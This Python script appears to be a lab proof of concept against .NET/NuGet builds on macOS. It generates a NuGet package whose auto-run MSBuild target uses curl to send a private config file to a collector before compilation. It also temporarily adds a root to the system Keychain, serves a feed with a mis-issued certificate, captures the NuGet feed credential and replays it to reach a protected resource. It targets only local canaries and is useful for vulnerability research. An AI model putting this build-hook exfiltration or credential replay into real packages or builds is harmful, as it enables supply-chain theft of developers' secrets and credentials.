#!/usr/bin/env python3
"""Use an actor-issued disposable leaf in a normal macOS .NET build lab."""
import base64
import argparse
import hashlib
import json
import os
from pathlib import Path
import secrets
import socket
import ssl
import subprocess
import sys
import time
import zipfile
import xml.etree.ElementTree as ET

HERE = Path(__file__).resolve().parent
PARENT = HERE
FIXTURES = HERE / "fixture"
ROOT = FIXTURES / "root.der"
OUT = HERE / "a31-run"
NUPKG = HERE / "a31-feed/Owned.TestPkg.1.0.0.nupkg"
CASES = (
    ("denied_san", "denied_forbidden_san"),
    ("valid", "valid_direct_root"),
    ("attack_1", "attack_no_san_forbidden_cn"),
    ("attack_repeat", "attack_no_san_forbidden_cn"),
)
DOTNET = "dotnet"
PYTHON = sys.executable


def make_package(collector_port):
    NUPKG.parent.mkdir(exist_ok=True)
    nuspec = '''<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">
<metadata><id>Owned.TestPkg</id><version>1.0.0</version>
<authors>owned-lab</authors><description>Owned canary transfer test</description></metadata>
</package>'''
    target = f'''<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
<Target Name="OwnedPackageTarget" BeforeTargets="CoreCompile">
<Exec Command="/usr/bin/curl --noproxy &quot;*&quot; --fail --silent --show-error --max-time 5 --data-binary @&quot;$(MSBuildProjectDirectory)/private-config.txt&quot; http://127.0.0.1:{collector_port}/collect" />
</Target></Project>'''
    ET.fromstring(target)
    with zipfile.ZipFile(NUPKG, "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("Owned.TestPkg.nuspec", nuspec)
        archive.writestr("buildTransitive/Owned.TestPkg.targets", target)
    return hashlib.sha256(NUPKG.read_bytes()).hexdigest()


def https_get(port_number, root_pem, auth=None):
    ctx = ssl.create_default_context(cadata=root_pem)
    with socket.create_connection(("127.0.0.1", port_number), timeout=5) as raw:
        with ctx.wrap_socket(raw, server_hostname="forbidden.test") as tls:
            headers = [f"GET /private HTTP/1.1", f"Host: forbidden.test:{port_number}", "Connection: close"]
            if auth is not None:
                headers.append("Authorization: " + auth)
            tls.sendall(("\r\n".join(headers) + "\r\n\r\n").encode())
            chunks = []
            while part := tls.recv(65536):
                chunks.append(part)
    response = b"".join(chunks)
    head, body = response.split(b"\r\n\r\n", 1)
    return int(head.split(b"\r\n", 1)[0].split()[1]), body


def run(args, timeout=25, **kwargs):
    return subprocess.run(args, text=True, stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT, timeout=timeout, **kwargs)


def port():
    with socket.socket() as sock:
        sock.bind(("127.0.0.1", 0))
        return sock.getsockname()[1]


def wait_ready(process):
    for _ in range(100):
        if process.poll() is not None:
            raise RuntimeError("fixture server exited before ready")
        if (line := process.stdout.readline().strip()) == "READY":
            return
        time.sleep(0.02)
    raise TimeoutError("fixture server did not start")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--protocol-only", action="store_true")
    args = parser.parse_args()
    HERE.mkdir(exist_ok=True)
    FIXTURES.mkdir(exist_ok=True)
    OUT.mkdir(exist_ok=True)
    if "NuGetPackageSourceCredentials_OwnedFeed" in os.environ:
        raise RuntimeError("ambient OwnedFeed credential would confound configured credential attribution")
    ROOT.write_bytes(ssl.PEM_cert_to_DER_cert((FIXTURES / "root.pem").read_text()))
    for name, source in (("attack_no_san_forbidden_cn", "attack"),
                         ("denied_forbidden_san", "denied")):
        (FIXTURES / f"{name}.cert.pem").write_bytes((FIXTURES / f"{source}-issued.pem").read_bytes())
        key = FIXTURES / f"{name}.key.pem"
        key.write_bytes((FIXTURES / "actor-leaf.key").read_bytes())
        key.chmod(0o600)
    (FIXTURES / "valid_direct_root.cert.pem").write_bytes((FIXTURES / "direct-root.cert.pem").read_bytes())
    direct_key = FIXTURES / "valid_direct_root.key.pem"
    direct_key.write_bytes((FIXTURES / "direct-root.key").read_bytes())
    direct_key.chmod(0o600)
    (FIXTURES / "valid_direct_root.der").write_bytes(
        ssl.PEM_cert_to_DER_cert((FIXTURES / "direct-root.cert.pem").read_text()))
    (HERE / "project").mkdir(exist_ok=True)
    (HERE / "project" / "OwnedFeed.csproj").write_text(
        '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><TargetFramework>net11.0</TargetFramework>'
        '<NuGetAudit>false</NuGetAudit></PropertyGroup><ItemGroup>'
        '<PackageReference Include="Owned.TestPkg" Version="1.0.0" /></ItemGroup></Project>')
    marker = "owned-feed-" + secrets.token_hex(8)
    expected = "Basic " + base64.b64encode(f"owned-user:{marker}".encode()).decode()
    expected_hash = hashlib.sha256(expected.encode()).hexdigest()
    (OUT / "expected-auth-sha256.txt").write_text(expected_hash + "\n")
    canary = ("A31 owned preexisting confidential config " + secrets.token_hex(32) + "\n").encode()
    canary_hash = hashlib.sha256(canary).hexdigest()
    collector_port = port()
    package_hash = make_package(collector_port)
    collector_log = OUT / "collector.jsonl"
    collector_log.unlink(missing_ok=True)
    collector = subprocess.Popen([PYTHON, str(HERE / "a31_protected_servers.py"), "collector",
        "--port", str(collector_port), "--log", str(collector_log)],
        stdout=subprocess.PIPE, stderr=(OUT / "collector.stderr.log").open("w"), text=True)
    try:
        wait_ready(collector)
        if args.protocol_only:
            run_cases = (("plain_control", "valid_direct_root"),)
            trustrow = {"protocol_only": True}
        else:
            run_cases = CASES
            trustrow = None
        perform_cases(run_cases, trustrow, marker, expected_hash, canary, canary_hash,
                      package_hash, collector_log, args.protocol_only)
    finally:
        collector.terminate()
        try:
            collector.wait(timeout=5)
        except subprocess.TimeoutExpired:
            collector.kill()
            collector.wait()


def perform_cases(run_cases, trustrow, marker, expected_hash, canary, canary_hash,
                  package_hash, collector_log, protocol_only):
    original_search = run(["security", "list-keychains", "-d", "user"]).stdout
    trust_keychain = Path("/Library/Keychains/System.keychain")
    root_label = "A31 owned root"
    existing = run(["security", "find-certificate", "-Z", "-c", root_label, str(trust_keychain)])
    if existing.returncode == 0:
        raise RuntimeError("unique test root already present in system Keychain; inspect before rerun")
    attempted = False
    all_rows = []
    captured_auth = None
    try:
        trust_started = time.monotonic()
        if not protocol_only:
            attempted = True
            result = run(["sudo", "security", "add-trusted-cert", "-d", "-p", "basic", "-p", "ssl",
                          "-r", "trustRoot", "-k", str(trust_keychain), str(ROOT)], timeout=45)
            if result.returncode:
                raise RuntimeError("add-trusted-cert: " + result.stdout)
            trust_probe = run(["security", "verify-cert", "-c", str(FIXTURES / "valid_direct_root.der"),
                               "-p", "ssl", "-n", "forbidden.test"], timeout=25)
            (OUT / "valid-direct-root-os-trust.log").write_text(trust_probe.stdout)
            if trust_probe.returncode:
                raise RuntimeError("direct-root OS trust preflight failed")
            trustrow = {"os_direct_root_verified": True}
        for label, case in run_cases:
            remaining = 240 - (time.monotonic() - trust_started)
            if not protocol_only and remaining < 30:
                raise TimeoutError("four-minute temporary trust window elapsed")
            tls_port, proxy_port = port(), port()
            case_dir = OUT / label
            case_dir.mkdir(exist_ok=True)
            project = case_dir / "OwnedFeed.csproj"
            project.write_text((HERE / "project" / "OwnedFeed.csproj").read_text())
            canary_file = case_dir / "private-config.txt"
            canary_file.write_bytes(canary)
            canary_file.chmod(0o600)
            config = case_dir / "NuGet.Config"
            scheme_host = f"http://127.0.0.1:{tls_port}" if protocol_only else f"https://forbidden.test:{tls_port}"
            config.write_text(f'''<?xml version="1.0" encoding="utf-8"?>
<configuration><packageSources><clear/><add key="OwnedFeed" value="{scheme_host}/index.json" allowInsecureConnections="true" /></packageSources>
<packageSourceCredentials><OwnedFeed><add key="Username" value="owned-user" />
<add key="ClearTextPassword" value="{marker}" />
<add key="ValidAuthenticationTypes" value="basic" /></OwnedFeed></packageSourceCredentials></configuration>''')
            config.chmod(0o600)
            log = case_dir / "requests.jsonl"
            log.unlink(missing_ok=True)
            capture_path = case_dir / "captured-auth.txt"
            capture_path.unlink(missing_ok=True)
            with open(case_dir / "server.log", "w") as server_log:
                server_args = [PYTHON, str(HERE / "a31_feed_server.py"), "--case", case,
                    "--fixtures", str(FIXTURES), "--tls-port", str(tls_port),
                    "--proxy-port", str(proxy_port), "--log", str(log),
                    "--nupkg", str(NUPKG), "--capture-auth", str(capture_path)]
                if protocol_only:
                    server_args.append("--plain")
                server = subprocess.Popen(server_args,
                    stdout=subprocess.PIPE, stderr=server_log, text=True)
                try:
                    wait_ready(server)
                    env = os.environ.copy()
                    env.update(HTTPS_PROXY=f"http://127.0.0.1:{proxy_port}",
                               HTTP_PROXY=f"http://127.0.0.1:{proxy_port}",
                               NO_PROXY="", no_proxy="", NUGET_PACKAGES=str(case_dir / "packages"),
                               NUGET_HTTP_CACHE_PATH=str(case_dir / "http-cache"),
                               DOTNET_CLI_HOME=str(case_dir / "cli-home"),
                               DOTNET_CLI_TELEMETRY_OPTOUT="1", DOTNET_SKIP_FIRST_TIME_EXPERIENCE="1",
                               DOTNET_CLI_USE_MSBUILD_SERVER="false")
                    if protocol_only:
                        env.update(HTTPS_PROXY="", HTTP_PROXY="", ALL_PROXY="", http_proxy="",
                                   https_proxy="", all_proxy="", NO_PROXY="127.0.0.1,localhost",
                                   no_proxy="127.0.0.1,localhost")
                    result = run([DOTNET, "build", str(project),
                                  "--disable-build-servers", "-v", "normal"],
                                 timeout=55 if protocol_only else min(55, remaining), env=env, cwd=case_dir)
                    (case_dir / "build.log").write_text(result.stdout)
                    time.sleep(0.5)
                    observed = [json.loads(line) for line in log.read_text().splitlines()]
                    rows = [row for row in observed if row.get("event") == "request"]
                    received = [json.loads(line) for line in collector_log.read_text().splitlines()] if collector_log.exists() else []
                    if capture_path.exists():
                        first_auth = capture_path.read_text()
                        if hashlib.sha256(first_auth.encode()).hexdigest() != expected_hash:
                            raise RuntimeError("captured authorization differs from configured credential")
                        if captured_auth is None and case == "attack_no_san_forbidden_cn":
                            captured_auth = first_auth
                    capture_path.unlink(missing_ok=True)
                    all_rows.append(dict(label=label, case=case, build_exit=result.returncode,
                                         connects=sum(row.get("event") == "connect" for row in observed),
                                         http_requests=len(rows),
                                         challenge_first=bool(rows and rows[0]["auth_sha256"] is None),
                                         credential_received=any(row["auth_sha256"] == expected_hash for row in rows),
                                         unexpected_credential=any(row["auth_sha256"] not in (None, expected_hash) for row in rows),
                                         canary_receipts=sum(x["sha256"] == canary_hash for x in received),
                                         package_requested=any(".nupkg" in row["request"] for row in rows)))
                    (OUT / "summary-partial.json").write_text(json.dumps({"trustcheck": trustrow, "results": all_rows}, indent=2))
                    if case == "valid_direct_root" and not rows:
                        raise RuntimeError("valid direct-root HTTP control failed; inspect proxy and restore logs")
                finally:
                    server.terminate()
                    try:
                        server.wait(timeout=5)
                    except subprocess.TimeoutExpired:
                        server.kill()
                        server.wait()
        receipt_counts = [r["canary_receipts"] for r in all_rows]
        if protocol_only:
            assert all_rows[0]["build_exit"] == 0 and receipt_counts == [1] and captured_auth
        else:
            assert [r["build_exit"] == 0 for r in all_rows] == [False, True, True, True]
            assert receipt_counts == [0, 1, 2, 3] and captured_auth
        protected_port = port()
        protected_log = OUT / "protected.jsonl"
        protected_log.unlink(missing_ok=True)
        protected_canary = OUT / "protected-canary.txt"
        protected_canary.write_bytes(b"A31 owned protected resource " + secrets.token_bytes(32))
        protected_canary.chmod(0o600)
        with open(OUT / "protected-server.stderr.log", "w") as server_log:
            protected = subprocess.Popen([PYTHON, str(HERE / "a31_protected_servers.py"), "protected",
                "--port", str(protected_port), "--log", str(protected_log),
                "--expected-auth-sha256", expected_hash, "--canary", str(protected_canary),
                "--fixtures", str(FIXTURES)], stdout=subprocess.PIPE, stderr=server_log, text=True)
            try:
                wait_ready(protected)
                root_pem = ssl.DER_cert_to_PEM_cert(ROOT.read_bytes())
                absent = https_get(protected_port, root_pem)
                wrong = https_get(protected_port, root_pem, "Basic " + base64.b64encode(b"owned-user:wrong").decode())
                replay = https_get(protected_port, root_pem, captured_auth)
                assert [absent[0], wrong[0], replay[0]] == [401, 401, 200]
                assert replay[1] == protected_canary.read_bytes()
                replay_row = {"absent_status": absent[0], "wrong_status": wrong[0],
                              "captured_replay_status": replay[0],
                              "protected_bytes_sha256": hashlib.sha256(replay[1]).hexdigest()}
            finally:
                protected.terminate()
                try:
                    protected.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    protected.kill()
                    protected.wait()
        summary = {"sdk": run([DOTNET, "--version"]).stdout.strip(),
                   "protocol_only": protocol_only, "package_sha256": package_hash,
                   "canary_sha256": canary_hash, "results": all_rows,
                   "replay": replay_row, "trustcheck": trustrow}
        print(json.dumps(summary, indent=2))
        (OUT / ("protocol-summary.json" if protocol_only else "summary.json")).write_text(json.dumps(summary, indent=2))
    finally:
        cleanup_error = None
        if attempted:
            present = run(["security", "find-certificate", "-Z", "-c", root_label, str(trust_keychain)])
            if present.returncode == 0:
                result = run(["sudo", "security", "delete-certificate", "-c", root_label,
                              str(trust_keychain)], timeout=45)
                if result.returncode:
                    cleanup_error = "delete-certificate failed: " + result.stdout
        current_search = run(["security", "list-keychains", "-d", "user"]).stdout
        if current_search != original_search:
            cleanup_error = "Keychain search list changed unexpectedly"
        for case_dir in OUT.iterdir():
            if case_dir.is_dir():
                (case_dir / "NuGet.Config").unlink(missing_ok=True)
                (case_dir / "private-config.txt").unlink(missing_ok=True)
                (case_dir / "captured-auth.txt").unlink(missing_ok=True)
                (case_dir / "served-key.pem").unlink(missing_ok=True)
                (case_dir / "served-cert.pem").unlink(missing_ok=True)
        (OUT / "protected-canary.txt").unlink(missing_ok=True)
        (OUT / "protected-server-key.pem").unlink(missing_ok=True)
        (OUT / "protected-server-cert.pem").unlink(missing_ok=True)
        present_after = run(["security", "find-certificate", "-Z", "-c", root_label, str(trust_keychain)])
        if present_after.returncode == 0:
            cleanup_error = "test root still present after cleanup"
        trust_after = run(["security", "dump-trust-settings", "-d"], timeout=20)
        if root_label in trust_after.stdout:
            cleanup_error = "test root trust setting still present after cleanup"
        if cleanup_error:
            raise RuntimeError("CLEANUP ERROR: " + cleanup_error)


if __name__ == "__main__":
    main()
